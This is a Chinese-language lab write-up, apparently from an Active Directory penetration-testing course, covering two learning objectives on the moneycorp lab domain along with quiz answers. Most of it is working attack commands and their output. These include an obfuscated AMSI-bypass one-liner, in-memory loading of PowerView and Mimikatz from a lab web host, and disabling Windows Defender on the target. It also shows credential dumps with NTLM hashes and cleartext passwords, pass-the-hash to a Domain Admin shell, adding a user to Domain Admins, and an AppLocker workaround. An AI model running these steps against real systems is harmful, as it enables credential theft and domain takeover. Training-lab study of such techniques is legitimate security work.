问题：Collectionmethod in BloodHound that covers all the collection methods
答案：All

# Learning Objective - 7

Task
> ● Domain user on one of the machines has access to a server where a domain admin is logged in.
> Identify:
> − The domain user
> − The server where the domain admin is logged in.
> ● Escalate privileges to Domain Admin
> − Using the method above.
> −  Using derivative local admin 



现在已经进到Jenkins所在的靶机，当前账号是ciadmin，是这台靶机内的adminstrators组成员

输入命令再次绕过AMSI和poswershell执行策略

## userhunter
下面命令可以把远程脚本导入到本机内存，无须下载执行脚本到本地。

运行invoke-userhunter，查找
```
PS C:\users\ciadmin> iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)
PS C:\users\ciadmin> invoke-userhunter

UserDomain      : dollarcorp.moneycorp.local
UserName        : Administrator
ComputerName    : dcorp-appsrv.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.217
SessionFrom     : 172.16.2.1
SessionFromName :
LocalAdmin      :

UserDomain      : dcorp
UserName        : svcadmin
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :
```

可以看到svcadmin登录过dcorp-mgmt，计算机名字是```dcorp-mgmt.dollarcorp.moneycorp.local```

查看当前账号（ciadmin）对哪些机器有本地管理员权限
```
PS C:\users\ciadmin> invoke-userhunter -checkAccess
UserDomain      : dcorp
UserName        : svcadmin
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      : True
```

看到是有LocalAdmin权限的，可以用以下命令在对方机器执行验证
```
PS C:\users\ciadmin> Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
dcorp\ciadmin
dcorp-mgmt
```
## 横向移动

引入Invoke-Mimikatz.ps1，并且在内存中执行

```
iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

从上面我们已经知道当前账号ciadmin可以横向登录到计算机dcorp-mgmt.dollarcorp.moneycorp.local，我们把登录的session保存在$sess
```$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local```

指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
```Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess```

指定目标靶机的session，在目标靶机执行Mimikatz
```Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess```


执行操作如下，导出所有ntml 哈希
```
PS C:\Program Files (x86)\Jenkins\workspace\project1> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project1>
PS C:\Program Files (x86)\Jenkins\workspace\project1> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BL(('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syt'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"({n`ULl},${t`RuE} )
PS C:\Program Files (x86)\Jenkins\workspace\project1> iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
PS C:\Program Files (x86)\Jenkins\workspace\project1> $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
PS C:\Program Files (x86)\Jenkins\workspace\project1> Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
PS C:\Program Files (x86)\Jenkins\workspace\project1> Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 62734 (00000000:0000f50e)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:26 AM
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
        msv :
         [00000003] Primary
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
         * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
        tspkg :
        wdigest :
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : df 1c e9 70 98 2f e1 9f 34 9d f2 d9 a4 75 e2 f0 88 4a 0c 4a 48 fc 82 64 0b cc d6 3d 8d c5 b0 1c 56 57 44 23 e1 d7 b3 0e 66 6d 7f 8c 23 00 39 4
 3d ee 67 ee 6f 28 b5 70 47 76 65 1b 66 a3 6f 71 85 73 7a 94 33 4e 38 a1 6f 2a 16 2c 23 7d 2f ba a2 86 fe 63 62 3e 2d 8e 9a af d6 1d 7e 05 a5 1c eb 04 d2 40 bf 6d c
 cb b7 fd db f6 23 ed bf 9b d3 30 80 03 d6 a9 87 14 88 47 09 8e 26 c3 b4 e7 f6 f6 5f 4b 62 e1 9c 3e 51 4b 7d 4c c0 a1 02 48 72 df b0 3c 32 55 09 ae e2 b7 aa e9 ca e
 f3 d7 fd 65 b4 92 f3 c1 ff ec 81 95 15 b3 db ce 7d 05 41 81 59 2c f6 fd 46 d4 43 cb 89 61 88 2e 5a 1a 99 5f 03 d9 ad 74 f6 c8 35 3e 33 7c 22 20 8a 70 b5 e6 35 1e 4
 60 6f f9 c8 a0 7e b6 9a 84 2a 42 91 df bd fb 54 f6 d8 a9 ba 29 5a 90 70 de ba 53
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
         * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
        tspkg :
        wdigest :
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 21649 (00000000:00005491)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               :
        msv :
         [00000003] Primary
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * NTLM     : 639c1adde3e0d1ba0d733c7d0d8f23ec
         * SHA1     : 944b2007bbb8137e85ecb019f409790040c435f9
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 207093 (00000000:000328f5)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:44:31 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1121
        msv :
         [00000003] Primary
         * Username : mgmtadmin
         * Domain   : dcorp
         * NTLM     : 95e2cd7ff77379e34c6e46265e75d754
         * SHA1     : 3ea8a133b86784c799f75ac1c81add76e34df1ea
         * DPAPI    : b826a190021809d711368730cfc6e41d
        tspkg :
        wdigest :
         * Username : mgmtadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : mgmtadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 64905 (00000000:0000fd89)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:41:27 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1122
        msv :
         [00000003] Primary
         * Username : svcadmin
         * Domain   : dcorp
         * NTLM     : b38ff50264b74508085d82c69794a4d8
         * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
         * DPAPI    : fd3c6842994af6bd69814effeedc55d3
        tspkg :
        wdigest :
         * Username : svcadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:24 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :
```

整理出所有导出的用户哈希
```
SQLTELEMETRY：639c1adde3e0d1ba0d733c7d0d8f23ec
DCORP-MGMT$：639c1adde3e0d1ba0d733c7d0d8f23ec
mgmtadmin：95e2cd7ff77379e34c6e46265e75d754
svcadmin：b38ff50264b74508085d82c69794a4d8
```

因为svcadmin是Domain Admins组成员，我们已经成功取得这个域的特权账号。



## 提权到Domain Admins方法（一）Over the hash

使用下面命令可以利用高权限哈希生成一个令牌shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```


回到我们的学生靶机，现在我们有了svcadmin的哈希信息，可以回到学生靶机用Mimikatz运行一个有Domain Admins权限的shell。需要注意，新打开的shell，还是在学生机里面，我们并没有进入域控，但其实是有Domain Admins权限的
```
PS C:\Windows\system32> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd c:/ad
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74
508085d82c69794a4d8 /run:powershell.exe"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c6979
4a4d8 /run:powershell.exe
user    : svcadmin
domain  : dollarcorp.moneycorp.local
program : powershell.exe
impers. : no
NTLM    : b38ff50264b74508085d82c69794a4d8
  |  PID  3104
  |  TID  4864
  |  LSA Process is now R/W
  |  LUID 0 ; 41299079 (00000000:02762c87)
  \_ msv1_0   - data copy @ 0000028946288B00 : OK !
  \_ kerberos - data copy @ 0000028946AF9928
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000028946B47AF8 (32) -> null

PS C:\ad>
```


新开的shell
```
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
dcorp\student366
```


在新开的shell里把当前账号添加进Domain Admins组中
```
PS C:\Windows\system32> net group "Domain Admins" student366 /ADD /DOMAIN
The request will be processed at a domain controller for domain dollarcorp.moneycorp.local.

The command completed successfully.
```

上面命令执行完成以后，另外一个shell查找所有域管理员,本账号（student366）已被成功添加进Domain Admins
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad>  Get-NetGroupMember -GroupName "Domain Admins" -Recurse


GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Hulk
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-68601
IsGroup      : False
MemberDN     : CN=Hulk,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : student369
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-45147
IsGroup      : False
MemberDN     : CN=student369,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : student366
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-45144
IsGroup      : False
MemberDN     : CN=student366,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : svcadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
IsGroup      : False
MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
```

## 提权到Domain Admins方法（二）

在学生机器用powerview查看当前账号拥有admin权限进入的计算机
```
PS C:\ad> Find-LocalAdminAccess
dcorp-std366.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
```

可以看见，除了本机还有一台dcorp-adminsrv

还可以用Find-PSRemotingLocalAdminAccess查看，结果一致
```
PS C:\ad> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\ad> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-std366
```

下面两个命令都可以横向移动到dcorp-adminsrv
```Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local```
或者
```Enter-PSSession  dcorp-adminsrv.dollarcorp.moneycorp.local```

可以看到当前账号dcorp\student366属于本地管理员（BUILTIN\Administrators）
```
PS C:\ad> Enter-PSSession  dcorp-adminsrv.dollarcorp.moneycorp.local
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
dcorp\student366 S-1-5-21-1874506631-3219952063-538504511-45144


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ===============================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
dcorp\RDPUsers                             Group            S-1-5-21-1874506631-3219952063-538504511-1116 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```


可以绕过powershell执行策略，但是没有办法绕过AMSI,产生了报错
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\student366\Documents>
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`B
L(('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syt'+'em') ) )."g`etf`iElD
"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"({n`ULl},${t`RuE} )
Get-varIABL : The term 'Get-varIABL' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included,
verify that the path is correct and try again.
At line:1 char:98
+ ... 'uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BL(('1Q'+' ...
+                                                     ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Get-varIABL:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

不能在当前靶机引入任何powershell脚本，（既不能下载到本地，也不能在内存中引入）因为在dcorp-adminsrv这台机器有 Applocker策略

> 什么是Applocker策略？
> AppLocker 可推进软件限制策略的应用控制特性和功能。 AppLocker 包含新的功能和扩展，允许你创建规则以允许或拒绝应用基于文件的唯一标识运行，并指定哪些用户或组可以运行这些应用
> 使用 AppLocker，你可以：
> 控制以下类型的应用：可执行文件（.exe 和 .com) 、 scripts (.js、.ps1、.vbs、.cmd 和 .bat) 、Windows Installer 文件 (.mst、.msi 和 .msp) 以及 DLL 文件（.dll 和 .ocx) ），以及打包的应用和封装应用安装程序 (appx) 。
> 根据从数字签名派生的文件属性（包括发布者、产品名称、文件名和文件版本）定义规则。 例如，可以创建基于通过更新持久化发布者属性的规则，也可以为文件的特定版本创建规则。
> 向安全组或单个用户分配规则。
> 创建规则异常。 例如，您可以创建一个规则，允许除注册表编辑器 (Regedit.exe Windows之外的所有进程运行) 。
> 使用仅审核模式部署策略，并在强制执行它之前了解其影响。
> 导入和导出规则。 导入和导出会影响整个策略。 例如，如果导出策略，将导出所有规则集合的所有规则，包括规则集合的强制设置。 如果导入策略，将覆盖现有策略的所有条件。
> 通过使用 cmdlet 简化 AppLocker 规则的创建Windows PowerShell管理。

下面命令枚举所有Applocker策略

```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> $ExecutionContext.SessionState.LanguageModeConstrainedLanguage
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections


PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 5a9340f3-f6a7-4892-84ac-0fffd51d9584
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 10541a9a-69a9-44e2-a2da-5538234e1ebc
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
```


从上面枚举的策略可以看到，只有```{%PROGRAMFILES%\*}```和```{%WINDIR%\*}```可以执行脚本

但是因为Constrained Language Mode，CLM，就算能把脚本拷贝到靶机，我们也不能执行，因为dcorp-adminsrv有CLM

什么是CLM?
>约束语言模式（Constrained Language Mode，CLM）是限制PowerShell的一种方法，可以限制PowerShell访问类似 Add-Type 之类的功能或者许多反射（reflective）方法（攻击者可以通过这些方法，在后续渗透工具中利用PowerShell运行时作为攻击媒介

那怎么办呢？

###  关闭Windows Defender
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student366\Documents> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.
```

### script调用自己

方法：
1. 复制一份Invoke-Mimikatz.ps1，取名为：Invoke-Mimikatz2.ps1
2. 在Invoke-Mimikatz2.ps1文件的最底部，加一行命令：Invoke-Mimikatz  #其实就是调用自己


把修改好的脚本拷贝到dcorp-adminsrv，注意根据上面的Applocker策略，只可以放在Program Files文件夹
```
Copy-Item .\Invoke-Mimikatz2.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

回到dcorp-adminsrv，已经可以看到拷贝过来的脚本
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> ls


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:18 AM                Common Files
d-----        7/16/2016   6:18 AM                internet explorer
d-----        8/20/2020   3:48 AM                Windows Defender
d-----        7/16/2016   6:18 AM                WindowsPowerShell
-a----        2/13/2022   6:39 AM        2530075 Invoke-Mimikatz2.ps1
```

执行Invoke-Mimikatz2，导出所有哈希
```
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Program Files> .\Invoke-Mimikatz2.ps1

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 166214 (00000000:00028946)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:43:30 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1115
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : dcorp
         * NTLM     : a98e18228819e8eec3dfa33cb68b0728
         * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a
         * DPAPI    : ddce77eab64944efda38b5cfdad5395f
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 67126 (00000000:00010636)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:41:26 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1117
        msv :
         [00000003] Primary
         * Username : appadmin
         * Domain   : dcorp
         * NTLM     : d549831a955fee51a43c83efb3928fa7
         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816
         * DPAPI    : 7ec84538f109f73066103b9d1629f95e
        tspkg :
        wdigest :
         * Username : appadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
        tspkg :
        wdigest :
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 21719 (00000000:000054d7)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:22 AM
SID               :
        msv :
         [00000003] Primary
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * NTLM     : 5e77978a734e3a7f3895fb0fdbda3b96
         * SHA1     : e9f3e1343aff21e696b7b7ecc72286aa451c067f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 66422 (00000000:00010376)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/26/2020 8:41:26 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-1113
        msv :
         [00000003] Primary
         * Username : websvc
         * Domain   : dcorp
         * NTLM     : cc098f204c5887eaa8253e7c2749156f
         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b
         * DPAPI    : 65e0a67c32db3788515ff56e9348e99c
        tspkg :
        wdigest :
         * Username : websvc
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:23 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 11/26/2020 8:41:22 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DCORP-ADMINSRV$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(powershell) # exit
Bye!
```

现在在dcorp-adminsrv机器上我们有了srvadmin的哈希，可以回到学习机器上使用Over pass the hash开启一个srvadmin的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local  /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
```

因为srvadmin可以横向到dcorp-mgmt,而dcorp-mgmt有与管理员的session，因此可以横向到dcorp-mgmt导出DA的NTML进行提权

问题：Process using svcadmin as service account
答案：sqlserver.exe

问题：NTLM hash of svcadmin account
答案：b38ff50264b74508085d82c69794a4d8

问题：We tried to extract clear-text credentials for scheduled tasks from? Flag value is like lsass, registry, credential vault etc.
答案：credential vault

问题：NTLM hash of srvadmin extracted from dcorp-adminsrv
答案：a98e18228819e8eec3dfa33cb68b0728

问题：NTLM hash of websvc extracted from dcorp-adminsrv
答案：cc098f204c5887eaa8253e7c2749156f


问题：NTLM hash of appadmin extracted from dcorp-adminsrv
答案：d549831a955fee51a43c83efb3928fa7



# Learning Objective - 8
> Task
> ● Dump hashes on the domain controller of dollarcorp.moneycorp.local.
> ● Using the NTLM hash of krbtgt account, create a Golden ticket.
> ● Use the Golden ticket to (once again) get domain admin privileges from a machine.


现在我们已经是Domain Admins管理组成员。在新开的DA权限的shell里运行Find-PSRemotingLocalAdminAccess
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
dcorp-dc
dcorp-mgmt
dcorp-std359
